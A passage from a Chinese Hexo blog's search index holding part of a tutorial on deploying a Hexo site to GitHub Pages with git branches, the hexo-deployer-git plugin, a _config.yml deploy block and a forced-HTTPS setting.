提供了版本管理功能，其中还有一个分支功能，你现在可以简单地将其理解为磁盘的不同盘符。</p></blockquote><p><code>你的github用户名.github.io</code> 部署后，GitHub Pages 将默认使用你的 master 分支作为静态文件部署。<br>所以我们最好新建一个 hexo 分支（命名无所谓）用来存储 Hexo 地源代码，master 分支则用来存储部署后的静态文件。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git checkout -b master</span><br></pre></td></tr></table></figure><p>这时便成功建立了一个 master 分支。（此后的工作都将在 master 分支下进行）</p><p>你可以通过 <code>git branch -v</code> 来查看当前有哪些分支，使用 <code>git branch 分支名</code> 来切换到对应的分支。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>为了更方便的部署到 GitHub Pages，Hexo 提供了 <code>hexo-deployer-git</code> 插件。</p><p>老规矩，安装。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git</span><br></pre></td></tr></table></figure><p>在 <code>_config.yml</code> 中配置。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">你此前新建的仓库的链接</span> <span class="comment"># 比如：https://github.com/meng-luo/meng-luo.github.io</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span> <span class="comment"># 默认使用 master 分支</span></span><br><span class="line">  <span class="attr">message:</span> <span class="string">Update</span> <span class="string">Hexo</span> <span class="string">Static</span> <span class="string">Content</span> <span class="comment"># 你可以自定义此次部署更新的说明</span></span><br></pre></td></tr></table></figure><p>保存，部署！</p><blockquote><p>第一次可能需要你输入用户名与密码。<br>密码输入的时候不会出现 ***，不要害怕，已经输入进去了。</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br><span class="line"><span class="comment">#可以省略为 hexo d</span></span><br></pre></td></tr></table></figure><p>等待完成后，打开网址 <code>https://用户名.github.io</code> 就能看到你的线上网站了。</p><blockquote><p>使用 https，http 可能无法正常打开。HTTPS 是多了安全加密的 HTTP，Chrome 浏览器已经默认会显示 <code>http</code> 链接为不安全。<br>为了安全，建议开启强制 https 跳转。<code>项目地址页面 -&gt; Settings -&gt; Pages -&gt; Enforce HTTPS</code></p></blockquote><p><img src="https://img.dreamfall.cn/post/hexo/github4.webp" alt="pages"></p><blockquote><p>此时，http 网址会自动重定向到 https</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HEXO </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
